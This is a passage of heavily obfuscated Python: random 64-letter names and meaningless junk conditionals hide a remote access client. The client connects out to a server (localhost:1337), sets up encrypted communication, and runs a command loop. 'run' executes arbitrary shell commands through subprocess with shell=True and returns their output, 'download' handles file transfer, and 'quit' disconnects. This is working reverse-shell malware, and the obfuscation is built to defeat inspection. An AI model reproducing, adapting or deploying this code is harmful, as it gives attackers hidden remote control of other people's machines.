    BLWDDvGNdAipfRhIXfQzcnxHCceCLrNpgjhByeNXTCuREWQujwBlEyTgTVQDzsvg = 'ZnsbdvXrewmtzXAnzrhqBmGQdHCgKQkXvvCBAUpXOqOvMYMUIFSpGMMniAxeiRGB'
    kKwBTGRyZmkkJiuTyDAabxeMTgIOeXHLiCOxoYdSIDlGEoxrhnEzDBrFRvQMmhDy = 'zFQKqsNkWKZsuSTDlhGsyprzuBYKPSRZGkAJZwqxuMpeCDvZEHPxogwMKROFFZUL'
    buEbRuLGNXduDBvuXchGvhITsKTZKjCEBzdNAVPtihaWzIeHOqlHrDKwEpQCsvkN = 'RGNnVfOXtZtUwIxugYBCBKQtWsBbanRZmeZRCeXsqliOmEZqoifxwIvuVHtnIJFs'
    nneALSyBSdPJssnSUEYQWeGzHsJdpPsCfasDuHIGOfkxXflgalgMVKbJAYOnRbMd = 'qcneInoBnssNunXEJhjPCpyQyHFHZUCHgzsakaWLzBjQhUXdMcvXcKuxfUqKRiCo'
    if LbIHhNZryMyDqVEwQDsNgiwRhyFtaXGzgZMdhQgNgQJBfWVHyBCLZkNDzETIdhTC != kKwBTGRyZmkkJiuTyDAabxeMTgIOeXHLiCOxoYdSIDlGEoxrhnEzDBrFRvQMmhDy:
        fLeTKZXfDiJqNFFuoUBSKEiquRaFpCEbtmPDoiSULIeQQFnGkUTjNeFtAthOEykQ = BLWDDvGNdAipfRhIXfQzcnxHCceCLrNpgjhByeNXTCuREWQujwBlEyTgTVQDzsvg
        for nneALSyBSdPJssnSUEYQWeGzHsJdpPsCfasDuHIGOfkxXflgalgMVKbJAYOnRbMd in kKwBTGRyZmkkJiuTyDAabxeMTgIOeXHLiCOxoYdSIDlGEoxrhnEzDBrFRvQMmhDy:
            if nneALSyBSdPJssnSUEYQWeGzHsJdpPsCfasDuHIGOfkxXflgalgMVKbJAYOnRbMd != BLWDDvGNdAipfRhIXfQzcnxHCceCLrNpgjhByeNXTCuREWQujwBlEyTgTVQDzsvg:
                fLeTKZXfDiJqNFFuoUBSKEiquRaFpCEbtmPDoiSULIeQQFnGkUTjNeFtAthOEykQ = fLeTKZXfDiJqNFFuoUBSKEiquRaFpCEbtmPDoiSULIeQQFnGkUTjNeFtAthOEykQ
            else:
                buEbRuLGNXduDBvuXchGvhITsKTZKjCEBzdNAVPtihaWzIeHOqlHrDKwEpQCsvkN = LbIHhNZryMyDqVEwQDsNgiwRhyFtaXGzgZMdhQgNgQJBfWVHyBCLZkNDzETIdhTC
    else:
        BLWDDvGNdAipfRhIXfQzcnxHCceCLrNpgjhByeNXTCuREWQujwBlEyTgTVQDzsvg = LbIHhNZryMyDqVEwQDsNgiwRhyFtaXGzgZMdhQgNgQJBfWVHyBCLZkNDzETIdhTC
        LbIHhNZryMyDqVEwQDsNgiwRhyFtaXGzgZMdhQgNgQJBfWVHyBCLZkNDzETIdhTC = buEbRuLGNXduDBvuXchGvhITsKTZKjCEBzdNAVPtihaWzIeHOqlHrDKwEpQCsvkN
        if BLWDDvGNdAipfRhIXfQzcnxHCceCLrNpgjhByeNXTCuREWQujwBlEyTgTVQDzsvg == LbIHhNZryMyDqVEwQDsNgiwRhyFtaXGzgZMdhQgNgQJBfWVHyBCLZkNDzETIdhTC:
            for nneALSyBSdPJssnSUEYQWeGzHsJdpPsCfasDuHIGOfkxXflgalgMVKbJAYOnRbMd in LbIHhNZryMyDqVEwQDsNgiwRhyFtaXGzgZMdhQgNgQJBfWVHyBCLZkNDzETIdhTC:
                if nneALSyBSdPJssnSUEYQWeGzHsJdpPsCfasDuHIGOfkxXflgalgMVKbJAYOnRbMd == BLWDDvGNdAipfRhIXfQzcnxHCceCLrNpgjhByeNXTCuREWQujwBlEyTgTVQDzsvg:
                    BLWDDvGNdAipfRhIXfQzcnxHCceCLrNpgjhByeNXTCuREWQujwBlEyTgTVQDzsvg = LbIHhNZryMyDqVEwQDsNgiwRhyFtaXGzgZMdhQgNgQJBfWVHyBCLZkNDzETIdhTC
                else:
                    BLWDDvGNdAipfRhIXfQzcnxHCceCLrNpgjhByeNXTCuREWQujwBlEyTgTVQDzsvg = buEbRuLGNXduDBvuXchGvhITsKTZKjCEBzdNAVPtihaWzIeHOqlHrDKwEpQCsvkN
    from core.AYmABzPjwzmmxOcfzKZuujIMqpJzidKtigCjDYhGgTCOsWHPrUkrWMcCDcsgKsLs import evwfnnvaUOxIdMSgirgwaYEUBMkoGZPUXYRwwPpBxecmgtvpxuHAFbjKNjPJvTIt, PaWZzpbpfTKwFKTszKjPMAaKVVnWBESorGAyTpBuTKufbJYlvVUoiWXaAGYgjFrj
    IIfNkPxzdlRpdIkIzHXkbXcwqIVVaGCyWtrXZooomHDJvWYWWQtxSedpoYNYbfpz = 'mxwxQJQjGszzAVZiYjGJeGKttICMbNdxsuEEUnaMuVcBjrDxThnNWbivtsICFIvD'
    MlABkkBNfRrvQmVSZcjRkAioJViybfvTHWLLglDtUHGrecHIdmprjyFOUyfvdXNU = 'DCDRbUGZzHGmCKEjVIXaghVzYlsYZjnGmoFaHFMDnDwXKxxBEIINwYWnFAToqFla'
    if IIfNkPxzdlRpdIkIzHXkbXcwqIVVaGCyWtrXZooomHDJvWYWWQtxSedpoYNYbfpz != MlABkkBNfRrvQmVSZcjRkAioJViybfvTHWLLglDtUHGrecHIdmprjyFOUyfvdXNU:
        LUQtpljTAHEeKpQjgVYpsCslsiKDABbDQjVdgtavLroYeHEvhCXCpSOWBGKrIxRi = 'iOASUhUFPoEJRKPiNhCTXcnuZdgNRlJCELjRdXgPxjBAyWPkJgfyUrGrlPHKPrsx'
        JNBlRPVzXrnecmzUoszuXfgwidrmsNODUByiHkngzQsNcIzfCxHckXJtVklQuoVb = 'ScwAUeLucQYZgLmuuJqAIPormwrxJjvwkicqTNPYqGIoAQUnmFIJiLAtUCFGMnvf'
        JNBlRPVzXrnecmzUoszuXfgwidrmsNODUByiHkngzQsNcIzfCxHckXJtVklQuoVb = LUQtpljTAHEeKpQjgVYpsCslsiKDABbDQjVdgtavLroYeHEvhCXCpSOWBGKrIxRi
except ImportError as VaXAwMqUwaBLvuYETMQgvZyTtzlfDMWuiOXwvYrZVnTmmdLtVsiDLUCgqvcVkiRs:
    RFFeaozIoPNULvlOaQVCVNqCoFUnPaXQudhPGPFbgbgpaLQcAhtVAbCZCTYbvsBf = 'ZiJyMtnavguGCYFuVtQWttfaqKHTryxHSztoCoMlduqGKlphnrBsyrtLDOIeCqAS'
    RzUFoUZPItKZdBjwQlNoBlKESfIeyOgGYIEygHEaZnWcVnjTzZIqrHKAxtkRwlZz = 'ExlWwGeSPdSrCFSBpiBBfwJKJzPAWqizlnLYcsNmqexjZUtYOJFiYRaeLTOAVGqU'
    htUljLDuCmsrClgnBWFGKxKBZoqDUSUSUnDlCrwyRxcvKzMODkoTmHTJnMkWNAPi = 'qQOFFCYnPRkCwqLHBWxjumPLhlOaqwuPNWbKYiOIUwJmwchXZORPzfrrTvbqbhXz'
    if RFFeaozIoPNULvlOaQVCVNqCoFUnPaXQudhPGPFbgbgpaLQcAhtVAbCZCTYbvsBf == RzUFoUZPItKZdBjwQlNoBlKESfIeyOgGYIEygHEaZnWcVnjTzZIqrHKAxtkRwlZz:
        wljBKzOqBUTLJgkOZPNrAznwxZZFQbFRrLnvatLdQcHRtmjtVbPwwcUnCIRsDXCx = 'uZJaGVBzZyJWshATMlJsFLOyCUhZWNaaXuFPnaIrWLZwbKnyZMeTlTbVcCgtqixO'
        wljBKzOqBUTLJgkOZPNrAznwxZZFQbFRrLnvatLdQcHRtmjtVbPwwcUnCIRsDXCx = RFFeaozIoPNULvlOaQVCVNqCoFUnPaXQudhPGPFbgbgpaLQcAhtVAbCZCTYbvsBf
    else:
        wljBKzOqBUTLJgkOZPNrAznwxZZFQbFRrLnvatLdQcHRtmjtVbPwwcUnCIRsDXCx = 'uZJaGVBzZyJWshATMlJsFLOyCUhZWNaaXuFPnaIrWLZwbKnyZMeTlTbVcCgtqixO'
        wljBKzOqBUTLJgkOZPNrAznwxZZFQbFRrLnvatLdQcHRtmjtVbPwwcUnCIRsDXCx = htUljLDuCmsrClgnBWFGKxKBZoqDUSUSUnDlCrwyRxcvKzMODkoTmHTJnMkWNAPi
    print(VaXAwMqUwaBLvuYETMQgvZyTtzlfDMWuiOXwvYrZVnTmmdLtVsiDLUCgqvcVkiRs)
    sys.exit(0)
XDhqiSBqqiFiqAgFiYQNboyjAFIxuznJhrIquwkaGtiHtHXVvNOjqPkCjiZqcNTw = sys.platform
nAKINovIkTxwTzoXcYTJPPxCYuzkIsyDwqVrXBWvXmBkRYxOwWCEtPjJeHucAEhm = 'nCqjetLEGyGqEjwnsNhAgzorCIVEUbfwCoOyrtmrrZviWNvnXuAqCmWKVxvqvPZf'
vuiXuvPaOxHbTjWbsNfUvpkAIMSkfkOkgNKfiGzYUjGbDZenQoRzPIMOQUdlPArR = 'ARfSabTwjWgLETlFDYvaAiXehfWfZcWukRqJWLaJaRLtyhMdTfaxwwUfBRJmuMqy'
IPiiEsffSeTPCRRUjDlJowGDKBAzqUqDVqKYfUytpzvXYFgYGGNgMaGbfqrUFftP = 'AGrinIRbBzxLfQlbBLAXjIUOyzoByZoPMHirSILysSKMKGOReJaNSLodylNjEkLd'
AttcWObRDsgNQxKJaRhQFEPwUVakWbsLeoMqGOjbxnWBpmFgcDMWYpPwgTjwBJXw = 'nzYWKHNuXcKuMOSQqMOSAqsaJsHUyhJUTcOOhMlMmSDfViNzzgaxZWVnQDFfYLcY'
uEnmwCGuhfgqruHaDILdNikutDETHgwuPqfKfRnVGQGemdYTDWDEyFxwJximNPYV = 'DvbplUWLIthQmpZuoJlrpjsnMmymOcZlhMLVhUyjuJgvIxMfIuxafdERLTBTOyAF'
tnKJGmaPVbfriCeWOBSlYzOpzMFxSWfafXtxpgWQVuURxPqYiIHLQzbNCPGsivrh = 'wxMoSpkqqBdXfKISRyfHGDMYedCppvdBuNvHKEsSuQDNOyVBxaNlLsrHJhjIfxlm'
if IPiiEsffSeTPCRRUjDlJowGDKBAzqUqDVqKYfUytpzvXYFgYGGNgMaGbfqrUFftP == AttcWObRDsgNQxKJaRhQFEPwUVakWbsLeoMqGOjbxnWBpmFgcDMWYpPwgTjwBJXw:
    for tnKJGmaPVbfriCeWOBSlYzOpzMFxSWfafXtxpgWQVuURxPqYiIHLQzbNCPGsivrh in uEnmwCGuhfgqruHaDILdNikutDETHgwuPqfKfRnVGQGemdYTDWDEyFxwJximNPYV:
        if tnKJGmaPVbfriCeWOBSlYzOpzMFxSWfafXtxpgWQVuURxPqYiIHLQzbNCPGsivrh == AttcWObRDsgNQxKJaRhQFEPwUVakWbsLeoMqGOjbxnWBpmFgcDMWYpPwgTjwBJXw:
            uEnmwCGuhfgqruHaDILdNikutDETHgwuPqfKfRnVGQGemdYTDWDEyFxwJximNPYV = nAKINovIkTxwTzoXcYTJPPxCYuzkIsyDwqVrXBWvXmBkRYxOwWCEtPjJeHucAEhm
        else:
            AttcWObRDsgNQxKJaRhQFEPwUVakWbsLeoMqGOjbxnWBpmFgcDMWYpPwgTjwBJXw = vuiXuvPaOxHbTjWbsNfUvpkAIMSkfkOkgNKfiGzYUjGbDZenQoRzPIMOQUdlPArR
ausDMXQLLoLplYjoOSbGETwVFSFWNuKGZfeYAGCVoeyHjqLAOEtErMJxpvTjzxDm      = 'localhost'
fdASdbUsgRIisAKKeGvAxJVHWWKzaLMLTgdbbPmzwzpwHRFDqZskTzbcRjkEofik      = 1337
MFRuVqernURCWVzKKeBRouIqzzaqCdYXNZLZhpgxNHAfPuFoqCALDYHIivMjFGIX    = 'b14ce95fa4c33ac2803782d18341869f'
def dOGhSjWYUiVJKUTgWbiCcLCNdCryPxWCQlhMeeUtYSPigcbRaVADpWqZmMyDOJBu():
    AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW = socket.socket()
    AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW.connect((ausDMXQLLoLplYjoOSbGETwVFSFWNuKGZfeYAGCVoeyHjqLAOEtErMJxpvTjzxDm, fdASdbUsgRIisAKKeGvAxJVHWWKzaLMLTgdbbPmzwzpwHRFDqZskTzbcRjkEofik))
    WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz = ZnSlsMtPHuxZiZtdggZNNZbzlZGOKaVkpkTQLVelCtNuiCQWxtNSxMyhJZsAWbwr(AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW)
    while True:
        buZFDjdluTVfvRkfUnazRjViiLfBgzkUjjhOaWcxJBrNvufPovsMuTnurWgQEefI = 'MCcRUCAxwGVWlbjBglcmwOfIyIOCTXmfzpnEPoVvMVGnLVRIUhUuHNIoXMEVQuNc'
        PPojnemGckQUswSbfbdSlzywUqylvkhxSeWhQWWtmObcGrekzjshOWYqKgjqacdf = 'TTRQkUMeOwXSwOWVYWgFAKwqryYsEjQXDSlLYJoReQrdpvxFsRIJdafonfcBqgjQ'
        BqxGcGtEqtSWYhjBTppyzimAPzBUdusbKfjOBbVZJDHulrUkvBkhHOXgHDjFdSLy = 'kNYKhRxsUvrxmaJXBIXaJqGxAqbqHkrRXXKTVycbXJwBSThZxBaFMYuOTQOxpfty'
        OWDPYgQXQcEOBhMTlqaTXJlrVdBJqwYNGQzeiwehcwRHCuXiPgjwsKwApolvzeRP = 'IGWwLFKrXpbmHALRdFDIhgmJeLawCvVpbwgXUPxxzLyRyJwQrniWssDUSUumUcFV'
        pKUmqUpqdFAzgMQdqfJyBlLOCcoLRhnSiWuRzEYHjmRKbGMSgeoJCoSqYlXWQrLi = 'bZfDsxwwOaOgUnEZcvmOCjTRvmqrkejAFZXUaAGTUGgJtRxztQosiloeqOrAbYwB'
        if buZFDjdluTVfvRkfUnazRjViiLfBgzkUjjhOaWcxJBrNvufPovsMuTnurWgQEefI in PPojnemGckQUswSbfbdSlzywUqylvkhxSeWhQWWtmObcGrekzjshOWYqKgjqacdf:
            buZFDjdluTVfvRkfUnazRjViiLfBgzkUjjhOaWcxJBrNvufPovsMuTnurWgQEefI = pKUmqUpqdFAzgMQdqfJyBlLOCcoLRhnSiWuRzEYHjmRKbGMSgeoJCoSqYlXWQrLi
            if PPojnemGckQUswSbfbdSlzywUqylvkhxSeWhQWWtmObcGrekzjshOWYqKgjqacdf in BqxGcGtEqtSWYhjBTppyzimAPzBUdusbKfjOBbVZJDHulrUkvBkhHOXgHDjFdSLy:
                PPojnemGckQUswSbfbdSlzywUqylvkhxSeWhQWWtmObcGrekzjshOWYqKgjqacdf = OWDPYgQXQcEOBhMTlqaTXJlrVdBJqwYNGQzeiwehcwRHCuXiPgjwsKwApolvzeRP
        elif PPojnemGckQUswSbfbdSlzywUqylvkhxSeWhQWWtmObcGrekzjshOWYqKgjqacdf in buZFDjdluTVfvRkfUnazRjViiLfBgzkUjjhOaWcxJBrNvufPovsMuTnurWgQEefI:
            BqxGcGtEqtSWYhjBTppyzimAPzBUdusbKfjOBbVZJDHulrUkvBkhHOXgHDjFdSLy = PPojnemGckQUswSbfbdSlzywUqylvkhxSeWhQWWtmObcGrekzjshOWYqKgjqacdf
            if BqxGcGtEqtSWYhjBTppyzimAPzBUdusbKfjOBbVZJDHulrUkvBkhHOXgHDjFdSLy in PPojnemGckQUswSbfbdSlzywUqylvkhxSeWhQWWtmObcGrekzjshOWYqKgjqacdf:
                PPojnemGckQUswSbfbdSlzywUqylvkhxSeWhQWWtmObcGrekzjshOWYqKgjqacdf = pKUmqUpqdFAzgMQdqfJyBlLOCcoLRhnSiWuRzEYHjmRKbGMSgeoJCoSqYlXWQrLi
        SPOrUfAGzmuoziEbcTwppyaSBeymnRLkgbIEbnKtOktmwwwVAFlwCdkWsxrwtDfg = AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW.recv(1024)
        SPOrUfAGzmuoziEbcTwppyaSBeymnRLkgbIEbnKtOktmwwwVAFlwCdkWsxrwtDfg = gzbycLsDIoAAIdkKrPhXzOCBShxQOsZnySBSMqTNGnQftXQwITlzDOwUPzFObZoY(SPOrUfAGzmuoziEbcTwppyaSBeymnRLkgbIEbnKtOktmwwwVAFlwCdkWsxrwtDfg, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz)
        ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ, _, action = SPOrUfAGzmuoziEbcTwppyaSBeymnRLkgbIEbnKtOktmwwwVAFlwCdkWsxrwtDfg.partition(' ')
        if ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'quit':
            xlDOtkDMJtqAenTkWbbDVnGwztWmjcyUaoppLeLIxezvtSpjPXkindPlFVtbGrzB = 'KWUEqfECvBQnidegvfwJxYwBFQGBNzHRJSuapUfBEctPEkyevqGYNpHRcAubEYAc'
            AnfVDHJkoVlWLbYfkeoNQLgjGGntfhhxrriJGapbgvqPJRrCtJmAMvbiQHZdFakn = 'ZWvKZzpXSsVPURWmauxhEJiJvmVsvjMjhIQlMCHJjSHAvOpnRMtklSaXsPbcZgMV'
            xAvMmScfWSecIldyiwTSQHUdNPpiFtNaXUzcSBmmfbtXPWHgOOAoGQrhPqtMQuEP = 'dppAweIbrDfEEHUSTWxkPLOShkYmzHLhhAqGmLBYnbgAlvZvrHYlJjYceXxLcIJz'
            if xlDOtkDMJtqAenTkWbbDVnGwztWmjcyUaoppLeLIxezvtSpjPXkindPlFVtbGrzB == AnfVDHJkoVlWLbYfkeoNQLgjGGntfhhxrriJGapbgvqPJRrCtJmAMvbiQHZdFakn:
                fgOQLQbNNDmRWYtnqSAQoOGeSONaYYhoLVakFgClCbSZlqAQAVsTiRGPUUWGlODa = 'hlZEwktDQuxyZKtlXUhAmVAqjLrxtkjJQVaTeGHYyNrXdEyQlwRzqbKTtzvYXuUG'
                fgOQLQbNNDmRWYtnqSAQoOGeSONaYYhoLVakFgClCbSZlqAQAVsTiRGPUUWGlODa = xlDOtkDMJtqAenTkWbbDVnGwztWmjcyUaoppLeLIxezvtSpjPXkindPlFVtbGrzB
            else:
                fgOQLQbNNDmRWYtnqSAQoOGeSONaYYhoLVakFgClCbSZlqAQAVsTiRGPUUWGlODa = 'hlZEwktDQuxyZKtlXUhAmVAqjLrxtkjJQVaTeGHYyNrXdEyQlwRzqbKTtzvYXuUG'
                fgOQLQbNNDmRWYtnqSAQoOGeSONaYYhoLVakFgClCbSZlqAQAVsTiRGPUUWGlODa = xAvMmScfWSecIldyiwTSQHUdNPpiFtNaXUzcSBmmfbtXPWHgOOAoGQrhPqtMQuEP
            AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW.close()
            sys.exit(0)
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'run':
            bILgJBlYhJUWfhSGoUkaPpErZZqgEcioqYNDSJNEXwggLWWtOzOWlOICqbTYNUaY = 'GcLXasCylFsDuflrKEpUiDvDgwZVQUXMOYjrmIIMRKFOaPKGAXAKjJDGVHimQJkq'
            ncRSxoPGCksAnnrSRMrBIkLOMdpSirBCJpeCdeYfnKEySZFcxuOvQFyHfwWccokV = 'ckLzxNToIGFEcbDITnpQTEXTTtVMTrqramImsRAKqsPXRXkoBVOAwsKPgJvdHgoZ'
            xHRFtJylAizuahTJbZOygcZIluthxiUqjjVyZqURNyEUGaEwjbQijmuWJTmUWPEV = 'OkjwITvEZlNrHvgbcTTebwoXVRdlDgLXLllgvrZbzMqokuApTiubTADOtUChwlhO'
            kkoTqhMDoTJVrOVmWaeaPlsiQepsYRFFdCgenJSERPbZgUsbEGUliSCrmjZjNOId = 'JEdENXNedhrfIBPCpHTsCiBohDZkTqxZPGvabcwYqxQVYEuaZJCVqufANLPLkbGZ'
            DeSSftrdTiGQiHSFYAEtXWISdkPVoxFOtzQAwvcOWrfntAMcvAmgSuMCLiXrchqg = 'ZJKhPnRNEIhuSYNgpbffPcWINZBmmeitaNDYbfXeYVwLhoeRSXumZEeXWmLtteTY'
            if bILgJBlYhJUWfhSGoUkaPpErZZqgEcioqYNDSJNEXwggLWWtOzOWlOICqbTYNUaY in ncRSxoPGCksAnnrSRMrBIkLOMdpSirBCJpeCdeYfnKEySZFcxuOvQFyHfwWccokV:
                bILgJBlYhJUWfhSGoUkaPpErZZqgEcioqYNDSJNEXwggLWWtOzOWlOICqbTYNUaY = DeSSftrdTiGQiHSFYAEtXWISdkPVoxFOtzQAwvcOWrfntAMcvAmgSuMCLiXrchqg
                if ncRSxoPGCksAnnrSRMrBIkLOMdpSirBCJpeCdeYfnKEySZFcxuOvQFyHfwWccokV in xHRFtJylAizuahTJbZOygcZIluthxiUqjjVyZqURNyEUGaEwjbQijmuWJTmUWPEV:
                    ncRSxoPGCksAnnrSRMrBIkLOMdpSirBCJpeCdeYfnKEySZFcxuOvQFyHfwWccokV = kkoTqhMDoTJVrOVmWaeaPlsiQepsYRFFdCgenJSERPbZgUsbEGUliSCrmjZjNOId
            elif ncRSxoPGCksAnnrSRMrBIkLOMdpSirBCJpeCdeYfnKEySZFcxuOvQFyHfwWccokV in bILgJBlYhJUWfhSGoUkaPpErZZqgEcioqYNDSJNEXwggLWWtOzOWlOICqbTYNUaY:
                xHRFtJylAizuahTJbZOygcZIluthxiUqjjVyZqURNyEUGaEwjbQijmuWJTmUWPEV = ncRSxoPGCksAnnrSRMrBIkLOMdpSirBCJpeCdeYfnKEySZFcxuOvQFyHfwWccokV
                if xHRFtJylAizuahTJbZOygcZIluthxiUqjjVyZqURNyEUGaEwjbQijmuWJTmUWPEV in ncRSxoPGCksAnnrSRMrBIkLOMdpSirBCJpeCdeYfnKEySZFcxuOvQFyHfwWccokV:
                    ncRSxoPGCksAnnrSRMrBIkLOMdpSirBCJpeCdeYfnKEySZFcxuOvQFyHfwWccokV = DeSSftrdTiGQiHSFYAEtXWISdkPVoxFOtzQAwvcOWrfntAMcvAmgSuMCLiXrchqg
            wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd = wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd.stdout.read() + wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd.stderr.read()
            AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW.sendall(aRmegvZNDGuhCtVQAlakKtZRoZafnQqupvFkrdupYnNDQMdYpuVagixWOykbEOkE(wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz))
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'download':
            NejBthtAxvlCrHAVPoHmVXnoUimLvTSZajERyGdOhtUTgqwQkVvpOjyMLWpwNibd = 'cNKJQIaMosLJsWMXSJZdLetDhIDNNBusqLazAWfcsUuEVGXpnxPkcyPqznkoOQfO'
            GYdwrWSwPuEnpeqgcuaskQKSBEuEkIlpzmOEvamzkCEfTyXmfqTWjNQIiTMdGXWL = 'zFSVsIYmoAzSRAWfxcYMuOuwBSrTPxBnszTGgcoDjddLOiDlTrajEKTBOxmEPbXu'
            lLREcYENTGwFewdBqnmynTelaeCBcvWDhfQehPzdtoxwHpDxjAqeHrYegPcUdTiW = 'tXIrWJIIrznbjdfdgEberUQeVoHgPbTAzormihsLGUjEYOhDFjpppNEDesMqDvDD'
            dmojfsuxWbrflfvmbrlyAMauteiJbSbbLCxVffdGbzvfatekYaYHVGlDTuMsJRsR = 'yamKSYzQYlgJYoiUFlyHklqqWUvYrwlTQbbjEEIjtMtjODoulNtQTAexEUusgCBO'
            sQeGcxTlCpTpucMtMkTOyUCNJSkNitxwTMPyBAdBogrXZzQzwaIkJuLTTEfdiMuL = 'VkqJcXIakAIMFqdEWxSqtkzEieeqdTSMnNlSJJxvBPseiHVSRZeiNxLgsLdnuGzJ'
            KoeVpSfmnbEozEMKUMnfAdbgSRdbgMpRtlPmGkUgPYZxznISAafaNvZLFetzSGlZ = 'AbSDodKHnHyCIGsUPmMpCHCtnDNLWOkiMsFgtmXlzuoHjkUCUGqMEFDYADlHfDpB'
            if lLREcYENTGwFewdBqnmynTelaeCBcvWDhfQehPzdtoxwHpDxjAqeHrYegPcUdTiW == dmojfsuxWbrflfvmbrlyAMauteiJbSbbLCxVffdGbzvfatekYaYHVGlDTuMsJRsR:
                for KoeVpSfmnbEozEMKUMnfAdbgSRdbgMpRtlPmGkUgPYZxznISAafaNvZLFetzSGlZ in sQeGcxTlCpTpucMtMkTOyUCNJSkNitxwTMPyBAdBogrXZzQzwaIkJuLTTEfdiMuL:
                    if KoeVpSfmnbEozEMKUMnfAdbgSRdbgMpRtlPmGkUgPYZxznISAafaNvZLFetzSGlZ == dmojfsuxWbrflfvmbrlyAMauteiJbSbbLCxVffdGbzvfatekYaYHVGlDTuMsJRsR:
                        sQeGcxTlCpTpucMtMkTOyUCNJSkNitxwTMPyBAdBogrXZzQzwaIkJuLTTEfdiMuL = NejBthtAxvlCrHAVPoHmVXnoUimLvTSZajERyGdOhtUTgqwQkVvpOjyMLWpwNibd
                    else:
                        dmojfsuxWbrflfvmbrlyAMauteiJbSbbLCxVffdGbzvfatekYaYHVGlDTuMsJRsR = GYdwrWSwPuEnpeqgcuaskQKSBEuEkIlpzmOEvamzkCEfTyXmfqTWjNQIiTMdGXWL
            for BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn in action.split():
                bIdVUxNsiKHwwuVxAtShpuCtNmwURpLCznGjytyextcNvYBdOtawaaAuknNgMayV = 'zSOZVNEzcOuDkdZbSJZksYOOlOnWVJwCipCBzvbrNwkCcqWXdWiZEVsljmDhoGiq'
                hFaHuhexqPZydGBaxRbnFKirSweTbSZQawolcDPKeFZojjLoZUXIryRHHIYRhkAZ = 'VJaCUbFShbJsyZOArotEmZvvscvNSJphHKfUJABkeoinytOyEsnEslTChtZAKRNu'
                jwgjFlMtLxytGCxKKSMSdqOLeVosJGasXErvnWFjhyVtePRgqwyIJfdtBdBsOtUv = 'zDJZUiyLoXBLMGgBhiOFOCrZLCTcoCTwjjsuzGqpeEzaIwGRVIPfufSYszIJZVwT'
                dSIKaakAryxGfRcpzeOZHqUsBnzWwQPwiCAANjBkOQDOSkkaBruogKbeCBCJNELU = 'UGiOLsTZkQiATZwtUHwLEbMZyiQJMXWMBdByURNLIaWgZLALZDEMUCsbvcsBtecN'
                AZnVbvmhVbrDAfqdDXyAZahoKRBxZkDpcsbDcNGFSNvVwxrZMJzeEJAPgTDaiiVV = 'tMTLKXxviMmNTakBanzhxIavJpsDHNhqSTKogaoTodvjaxuwlwPAoJVIJBBTunBI'
                if bIdVUxNsiKHwwuVxAtShpuCtNmwURpLCznGjytyextcNvYBdOtawaaAuknNgMayV in hFaHuhexqPZydGBaxRbnFKirSweTbSZQawolcDPKeFZojjLoZUXIryRHHIYRhkAZ:
                    bIdVUxNsiKHwwuVxAtShpuCtNmwURpLCznGjytyextcNvYBdOtawaaAuknNgMayV = AZnVbvmhVbrDAfqdDXyAZahoKRBxZkDpcsbDcNGFSNvVwxrZMJzeEJAPgTDaiiVV
                    if hFaHuhexqPZydGBaxRbnFKirSweTbSZQawolcDPKeFZojjLoZUXIryRHHIYRhkAZ in jwgjFlMtLxytGCxKKSMSdqOLeVosJGasXErvnWFjhyVtePRgqwyIJfdtBdBsOtUv:
                        hFaHuhexqPZydGBaxRbnFKirSweTbSZQawolcDPKeFZojjLoZUXIryRHHIYRhkAZ = dSIKaakAryxGfRcpzeOZHqUsBnzWwQPwiCAANjBkOQDOSkkaBruogKbeCBCJNELU
                elif hFaHuhexqPZydGBaxRbnFKirSweTbSZQawolcDPKeFZojjLoZUXIryRHHIYRhkAZ in bIdVUxNsiKHwwuVxAtShpuCtNmwURpLCznGjytyextcNvYBdOtawaaAuknNgMayV:
                    jwgjFlMtLxytGCxKKSMSdqOLeVosJGasXErvnWFjhyVtePRgqwyIJfdtBdBsOtUv = hFaHuhexqPZydGBaxRbnFKirSweTbSZQawolcDPKeFZojjLoZUXIryRHHIYRhkAZ
                    if jwgjFlMtLxytGCxKKSMSdqOLeVosJGasXErvnWFjhyVtePRgqwyIJfdtBdBsOtUv in hFaHuhexqPZydGBaxRbnFKirSweTbSZQawolcDPKeFZojjLoZUXIryRHHIYRhkAZ:
                        hFaHuhexqPZydGBaxRbnFKirSweTbSZQawolcDPKeFZojjLoZUXIryRHHIYRhkAZ = AZnVbvmhVbrDAfqdDXyAZahoKRBxZkDpcsbDcNGFSNvVwxrZMJzeEJAPgTDaiiVV
